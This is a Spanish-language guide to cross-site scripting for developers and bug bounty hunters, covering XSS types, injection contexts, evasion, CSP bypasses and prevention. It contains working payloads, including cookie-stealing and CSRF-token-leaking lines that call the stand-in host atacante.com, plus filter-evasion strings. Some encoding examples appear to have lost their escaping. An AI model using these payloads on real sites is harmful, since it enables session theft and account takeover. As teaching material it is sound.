# XSS (Cross-Site Scripting) - Guía Completa

El Cross-Site Scripting (XSS) es una de las vulnerabilidades más críticas y prevalentes en aplicaciones web. Esta vulnerabilidad permite a un atacante inyectar scripts maliciosos que se ejecutan en el navegador de otros usuarios en el contexto del sitio vulnerable, comprometiendo la seguridad y privacidad de las víctimas.[^2]

## ¿Qué es XSS?

XSS es una vulnerabilidad que permite a un atacante inyectar scripts maliciosos (principalmente JavaScript) en páginas web vistas por otros usuarios. Estos scripts se ejecutan en el navegador de la víctima con los mismos privilegios que el sitio web legítimo, lo que puede tener consecuencias devastadoras.[^1]

A diferencia de otros ataques dirigidos al servidor, XSS se enfoca específicamente en los usuarios de la aplicación, convirtiendo sus navegadores en herramientas de ataque.[^3]

## Impacto Real del XSS

El XSS va mucho más allá de mostrar un simple `alert()`. Sus impactos pueden incluir:[^3]

**Robo de Sesión (Cookie Stealing):** Acceder a las cookies de sesión de la víctima para suplantar su identidad
**Keylogging:** Capturar las pulsaciones de teclado de la víctima
**Phishing:** Modificar la página para mostrar formularios de login falsos
**Defacement:** Modificar la apariencia del sitio web
**Redirección Maliciosa:** Enviar a la víctima a sitios que descarguen malware
**Ejecución de Acciones no Autorizadas:** Realizar acciones como si fuera el usuario legítimo
**Bypass de CSRF:** Los scripts pueden generar peticiones con tokens CSRF válidos
**Escaneo de Red Interna:** Usar el navegador como proxy para escanear la red local[^1]

## Tipos Principales de XSS

### 1. XSS Reflejado (Reflected XSS)

El XSS reflejado es la forma más común donde el payload malicioso se incluye en la petición HTTP y se "refleja" inmediatamente en la respuesta del servidor.[^3]

**Características:**

- El payload se envía típicamente en parámetros GET de la URL
- Requiere interacción de la víctima (hacer clic en enlace malicioso)
- No persistente - solo afecta a la sesión actual
- También conocido como XSS no persistente o Tipo I[^5]

**Ejemplo Práctico:**

HTML vulnerable:

```html
<html>
  <body>
    <form method="GET" action="saludo.php">
      <p>¿Cuál es tu nombre?</p>
      <input name="name" type="text">
      <button type="submit">Enviar</button>
    </form>
  </body>
</html>
```

PHP vulnerable:

```php
<?php
  if (isset($_GET['name'])) {
    echo "Hola, " . $_GET['name'] . "!";
  }
?>
```

**Explotación:**
URL maliciosa: `https://victima.com/saludo.php?name=<script>alert("XSS")</script>`

**Payload de Robo de Cookies:**

```javascript
<script>
var img = new Image(); 
img.src = "http://atacante.com/steal?cookie=" + document.cookie;
</script>
```

### 2. XSS Almacenado (Stored XSS)

El XSS almacenado es considerado el más peligroso porque el payload se guarda permanentemente en el servidor.[^5]

**Características:**

- El script malicioso se almacena en base de datos, archivos o logs
- Se ejecuta automáticamente cuando cualquier usuario visita la página afectada
- No requiere interacción específica más allá de cargar la página
- También conocido como XSS persistente o Tipo II[^5]
- Puede crear gusanos XSS que se propagan automáticamente[^6]

**Superficies de Ataque Comunes:**

- Campos de perfil de usuario
- Comentarios y posts en foros
- Nombres de archivos subidos
- Logs visibles por administradores
- Formularios de contacto[^6]

### 3. XSS Basado en DOM (DOM-based XSS)

Esta variante ocurre enteramente en el lado del cliente, sin que el servidor procese el payload malicioso.[^8]

**Características:**

- La vulnerabilidad reside en el código JavaScript del cliente
- El payload puede no llegar nunca al servidor
- Difícil de detectar por WAFs o logs del servidor
- Explota fuentes (sources) y sumideros (sinks) peligrosos[^8]

**Ejemplo Vulnerable:**

```javascript
// Fuente peligrosa
var searchTerm = location.hash.substring(1); 
// Sumidero peligroso
document.getElementById('searchResults').innerHTML = "Resultados para: " + searchTerm;
```

**Payload de Ataque:**
`https://victima.com/busqueda#<img src=x onerror=alert(1)>`

**Fuentes Comunes (Sources):**

- `document.URL`
- `location.href`, `location.search`, `location.hash`
- `document.referrer`
- `window.name`
- `localStorage.getItem()`, `sessionStorage.getItem()`

**Sumideros Peligrosos (Sinks):**

- `element.innerHTML`, `element.outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `setTimeout()`, `setInterval()`
- `element.setAttribute('href', 'javascript:...')`
- jQuery's `$(...).html()`, `$(...).append()`[^7]

### 4. Blind XSS

Variante de XSS almacenado donde la ejecución ocurre en una parte de la aplicación que el atacante no ve directamente.[^5]

**Características:**

- El atacante inyecta payloads "a ciegas"
- Requiere servidores de callback para detectar ejecución
- Común en paneles de administración internos
- Difícil de detectar manualmente

**Herramientas:**

- **Interactsh (ProjectDiscovery):** Genera URLs únicas para callbacks
- **Burp Collaborator Client:** Similar funcionalidad
- **XSS Hunter Express:** Alternativa auto-hospedable

## Contextos de Inyección y Técnicas de Escape

### Inyección Directa en HTML

```html
<!-- Contexto: Entre etiquetas -->
<div>AQUÍ_INPUT</div>
<!-- Payload: --><script>alert(1)</script>

<!-- Contexto: En URLs -->
<a href="AQUÍ_INPUT">Link</a>
<!-- Payload: -->javascript:alert(1)
```

### Inyección en Atributos HTML

```html
<!-- Contexto: Valor de atributo -->
<input type="text" value="AQUÍ_INPUT">
<!-- Payload: -->"><script>alert(1)</script>
<!-- O con event handler: -->" onmouseover="alert(1);"
```

### Inyección en JavaScript

```javascript
// Contexto: String literal
var username = 'AQUÍ_INPUT';
// Payload: ';alert(document.domain);var ignore='

// Contexto: Numérico
var userId = AQUÍ_INPUT;
// Payload: 1; alert(1)
```

### Inyección en CSS

```css
/* Robo de datos con CSS */
input[name="csrf_token"][value^="a"] { 
  background-image: url("http://atacante.com/log?char=a"); 
}
```

## Técnicas Avanzadas de Evasión

### Evasión de Filtros WAF

**Case Insensitivity:**

```html
<ScRiPt>alert(1)</sCrIpT>
```

**Codificación:**

```html
<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- HTML Entities -->
<script>alert(1)</script>

<!-- Hexadecimal -->
<svg/onload=\u0066\u0065\u0074\u0063\u0068(`//atacante.com?cookie=`+document.cookie)>
```

**Tags Alternativos:**

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)></svg>
<iframe src="javascript:alert(1)"></iframe>
<details open ontoggle=alert(1)>
<marquee onstart="alert(1)">
```

**Obfuscación JavaScript:**

```javascript
// Base64
eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))

// String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

// Template literals
javascript:alert`1`
```

### Mutation XSS (mXSS)

mXSS explota diferencias en cómo el parser del navegador y los sanitizadores interpretan HTML. El navegador "corrige" HTML malformado de manera que crea vulnerabilidades no obvias en el HTML original.[^11]

**Ejemplo:**

```html
<!-- Input aparentemente seguro -->
<INVALID TAG>
{{constructor.constructor('alert(1)')()}}

<!-- Se convierte en ejecutable después del parsing -->
```

Esta técnica es especialmente efectiva porque bypassa sanitizadores tradicionales que no anticipan las mutaciones del browser.[^10]

## Content Security Policy (CSP) y Bypasses

CSP es una cabecera HTTP crucial para mitigar XSS definiendo fuentes válidas para recursos.[^13]

**Ejemplo de Política CSP:**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com; object-src 'none';
```

### Técnicas Comunes de Bypass

**1. Explotación de Endpoints JSONP:**

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

**2. Subida de Archivos:**
Si `script-src 'self'` permite subir archivos JS:

```html
<script src="/uploads/payload.js"></script>
```

**3. Base URI Injection:**

```html
<base href="https://atacante.com/">
<!-- Ahora todos los scripts relativos se cargan desde el dominio del atacante -->
```

**4. Data URIs:**
Si `script-src data:` está permitido:

```html
<script src="data:text/javascript,alert(1)"></script>
```

## XSS en Frameworks Modernos

### React

React proporciona protección automática contra XSS através de JSX:[^15]

**Protecciones:**

- Escape automático de valores en JSX
- `dangerouslySetInnerHTML` como advertencia explícita
- React DOM escapa valores antes del renderizado

**Vulnerabilidades potenciales:**

```javascript
// Peligroso - usar con precaución
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

### Angular

Angular tiene protecciones robustas contra XSS:[^15]

**Protecciones:**

- Escape contextual automático
- DomSanitizer para contenido confiable
- Compatibilidad con CSP
- Sanitización automática de HTML, estilos y URLs

**Bypasses potenciales:**

```typescript
// Peligroso - bypassa la sanitización
this.sanitizer.bypassSecurityTrustHtml(userInput)
```

### Vue.js

Vue.js también implementa protecciones sólidas:[^15]

**Protecciones:**

- Escape automático en templates
- Directiva `v-html` para HTML crudo (usar con precaución)
- Plugin vue-sanitize para sanitización adicional

## Inyección de Templates del Cliente (CSTI)

CSTI es una técnica que explota frameworks de templates del lado del cliente:[^18][^19]

**AngularJS (versiones antiguas):**

```javascript
{{constructor.constructor('alert(1)')()}}
```

**Vue.js:**

```javascript
{{_createElementBlock.constructor("alert(1)")()}}
```

Esta técnica puede bypassar medidas de seguridad tradicionales porque el código malicioso se ejecuta después de la sanitización HTML.[^17]

## Técnicas de Detección y Testing

### Detección Manual

**1. Identificar puntos de entrada:**

- Parámetros GET/POST
- Campos de formulario
- Headers HTTP reflejados

**2. Testing básico:**

```html
<!-- String de prueba -->
TESTXSS

<!-- Tags HTML inocuas -->
<u>test</u>
<b>test</b>

<!-- Payloads básicos -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### Herramientas Automatizadas

**DOM Invader (Burp Suite):**

- Identifica sources y sinks automáticamente
- Inyecta strings de prueba en todas las fuentes posibles
- Proporciona stack traces para debugging[^9]

**Análisis Estático:**

- ESLint con plugins de seguridad para detectar patrones peligrosos
- Revisión de código para identificar uso inseguro de APIs[^9]

## Estrategias de Prevención

### 1. Codificación de Salida Contextual

La defensa principal contra XSS es la codificación apropiada según el contexto:[^3]

**HTML Context:**

```html
<!-- Codificar < > & " ' -->
<script> → <script>
```

**JavaScript Context:**

```javascript
// Unicode escaping
\u003cscript\u003e
```

**URL Context:**

```
%3Cscript%3E
```

### 2. Validación de Entrada

**Whitelist approach:**

```php
// Solo permitir caracteres alfanuméricos
if (preg_match('/^[a-zA-Z0-9]+$/', $input)) {
    // Processar input
}
```

### 3. Sanitización HTML

Para contenido HTML legítimo, usar librerías probadas:

- **DOMPurify** (JavaScript)
- **HTMLPurifier** (PHP)
- **Bleach** (Python)

### 4. Content Security Policy

Implementar CSP estricta:[^12]

```http
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-randomvalue123'; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data:;
```

### 5. Headers de Seguridad Adicionales

```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

### 6. Cookies Seguras

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

### 7. Frameworks Seguros

Usar frameworks modernos que implementen protecciones por defecto:[^15]

- React con JSX
- Angular con sanitización automática
- Vue.js con escape de templates

## Mejores Prácticas para Desarrolladores

### Principios Fundamentales

1. **Asumir que toda entrada es maliciosa** - Nunca confiar en datos del usuario
2. **Codificación contextual** - Codificar datos según donde se usen
3. **Principio de menor privilegio** - Limitar permisos y accesos
4. **Defensa en profundidad** - Implementar múltiples capas de seguridad

### Testing y Auditoría

1. **Pentesting regular** - Pruebas de penetración periódicas
2. **Code review** - Revisión de código enfocada en seguridad
3. **Automated scanning** - Herramientas de análisis estático y dinámico
4. **Bug bounty programs** - Programas de recompensas por vulnerabilidades

### Consideraciones Especiales para Bug Bounty

Cuando busques XSS en aplicaciones modernas:

1. **Enfócate en funcionalidades complejas** - Editores WYSIWYG, file uploads, etc.
2. **Revisa templates del lado del cliente** - CSTI en SPAs
3. **Prueba different encodings** - UTF-8, UTF-16, diferentes charsets
4. **Combina con otras vulnerabilidades** - CSRF + XSS, Open Redirect + XSS
5. **Busca en áreas menos obvias** - Error pages, 404 pages, admin panels

El XSS sigue siendo una amenaza crítica en 2024, ocupando el puesto \#1 en la lista CWE Top 25. Aunque los frameworks modernos han mejorado significativamente las defensas por defecto, las vulnerabilidades persisten por configuraciones incorrectas, uso inseguro de APIs y la complejidad creciente de las aplicaciones web.[^2]

La clave para una defensa efectiva está en combinar múltiples estrategias: codificación de salida adecuada, CSP restrictiva, frameworks seguros y testing continuo. Para los bug bounty hunters, comprender las técnicas modernas de evasión y los contextos específicos de cada aplicación es fundamental para identificar vulnerabilidades que los scanners automatizados podrían pasar por alto.
<span style="display:none">[^23][^25][^27][^29][^31][^33][^35][^37][^39][^41][^43][^45][^47][^49][^51][^53][^55][^57][^59][^61][^63][^65][^67][^69][^70]</span>

<div style="text-align: center">XSS (Cross-Site Scripting) - Guía Completa</div>

[^1]: https://www.jit.io/resources/app-security/what-is-cve-2024-44308-xss-and-how-to-protect-from-it
    
[^2]: https://www.invicti.com/blog/web-security/2024-cwe-top-25-list-xss-sqli-buffer-overflows/
    
[^3]: https://portswigger.net/web-security/cross-site-scripting
    
[^4]: https://www.securityjourney.com/post/understanding-the-4-types-of-cross-site-scripting-xss-vulnerabilities
    
[^5]: https://owasp.org/www-community/attacks/xss/
    
[^6]: https://www.uprootsecurity.com/blog/stored-xss-attack-explained
    
[^7]: https://cyberphinix.de/blog/xss-basics/
    
[^8]: https://community.f5.com/kb/technicalarticles/cross-site-scripting-xss-exploit-paths/275166
    
[^9]: https://www.vaadata.com/blog/dom-based-xss-attacks-principles-impacts-exploitations-and-security-best-practices/
    
[^10]: https://www.twingate.com/blog/glossary/mutation-xss-attack
    
[^11]: https://kpmg.co.il/technologyconsulting/blog/what-is-mutation-xss-mxss
    
[^12]: https://curity.io/resources/learn/oauth-xss-prevention/
    
[^13]: https://www.browserstack.com/guide/csp-bypass
    
[^14]: https://www.angularminds.com/blog/vulnerabilities-and-solutions-for-react-js-security
    
[^15]: https://pentescope.com/essential-xss-prevention-strategies-for-developers/
    
[^16]: https://www.stackhawk.com/blog/angular-xss-guide-examples-and-prevention/
    
[^17]: https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
    
[^18]: https://portswigger.net/kb/issues/00200308_client-side-template-injection
    
[^19]: https://www.paloaltonetworks.com/blog/cloud-security/template-injection-vulnerabilities/
    
[^20]: https://www.cloudflare.com/learning/security/how-to-prevent-xss-attacks/
    
[^21]: https://www.securityjourney.com/post/mitigating-preventing-cross-site-scripting-xss-vulnerabilities-an-example
    
[^22]: https://github.com/Ant1sec-ops/CVE-2024-30875
    
[^23]: https://www.code-intelligence.com/blog/what-is-cross-site-scripting
    
[^24]: https://www.vaadata.com/blog/xss-cross-site-scripting-vulnerabilities-principles-types-of-attacks-exploitations-and-security-best-practices/
    
[^25]: https://www.appgate.com/blog/cross-site-scripting-xss-in-bigid-privacy-portal
    
[^26]: https://vercel.com/guides/understanding-xss-attacks
    
[^27]: https://www.memcyco.com/guide-to-preventing-xss-attacks/
    
[^28]: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
    
[^29]: https://security.snyk.io/vuln/SNYK-RUBY-BOOTSTRAP-7640987
    
[^30]: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS
    
[^31]: https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-9.0
    
[^32]: https://www.reddit.com/r/bugbounty/comments/1g8hffv/new_xss_attack_techniques_2024/
    
[^33]: https://www.invicti.com/learn/cross-site-scripting-xss/
    
[^34]: https://arxiv.org/html/2504.08176v1
    
[^35]: https://www.linkedin.com/pulse/mastering-xss-advanced-techniques-bypass-web-application-firewalls-r9thc
    
[^36]: https://www.softwaresecured.com/post/types-of-xss-attacks
    
[^37]: https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/
    
[^38]: https://akimbocore.com/article/finding-dom-xss/
    
[^39]: https://www.cobalt.io/vulnerability-wiki/v5-validation-sanitization/reflected-xss-waf-bypass
    
[^40]: https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/
    
[^41]: https://www.cyberchief.ai/2024/11/dom-based-xss-fix.html
    
[^42]: https://brightsec.com/blog/how-i-bypassed-an-imperva-waf/
    
[^43]: https://nvd.nist.gov/vuln/detail/cve-2024-20800
    
[^44]: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
    
[^45]: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
    
[^46]: https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8184974
    
[^47]: https://www.sysdig.com/blog/fuzzing-and-bypassing-the-aws-waf
    
[^48]: https://www.hackerone.com/knowledge-center/how-xss-payloads-work-code-examples-and-how-prevent-them
    
[^49]: https://onlinelibrary.wiley.com/doi/abs/10.1002/nem.2264
    
[^50]: https://www.vaadata.com/blog/content-security-policy-bypass-techniques-and-security-best-practices/
    
[^51]: https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
    
[^52]: https://payatu.com/blog/content-security-policy/
    
[^53]: https://www.sans.org/white-papers/40380/
    
[^54]: https://jorianwoltjer.com/blog/p/research/mutation-xss
    
[^55]: https://www.cobalt.io/blog/csp-and-bypasses
    
[^56]: https://sonarsource.github.io/mxss-cheatsheet/examples/
    
[^57]: https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques
    
[^58]: https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
    
[^59]: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass
    
[^60]: https://notes.theoffsecgirl.com/06-hacking-ios/06e-owasp-mobile-top-10
    
[^61]: https://github.com/requarks/wiki/security/advisories/GHSA-xjcj-p2qv-q3rf
    
[^62]: https://www.reddit.com/r/xss/comments/13rghb4/does_xss_exists_in_framework_like_react_vue_and/
    
[^63]: https://flatt.tech/research/posts/why-xss-persists-in-this-frameworks-era/
    
[^64]: https://www.invicti.com/web-application-vulnerabilities/client-side-template-injection
    
[^65]: https://www.cybersrely.com/how-to-prevent-xss-in-restful-apis/
    
[^66]: https://hackerone.com/reports/2234564
    
[^67]: https://thehackernews.com/2025/07/why-react-didnt-kill-xss-new-javascript.html
    
[^68]: https://security.snyk.io/vuln/SNYK-PHP-LARAVELFRAMEWORK-9400966
    
[^69]: https://www.invicti.com/web-application-vulnerabilities/angularjs-client-side-template-injection
    
[^70]: https://vuejs.org/guide/best-practices/security
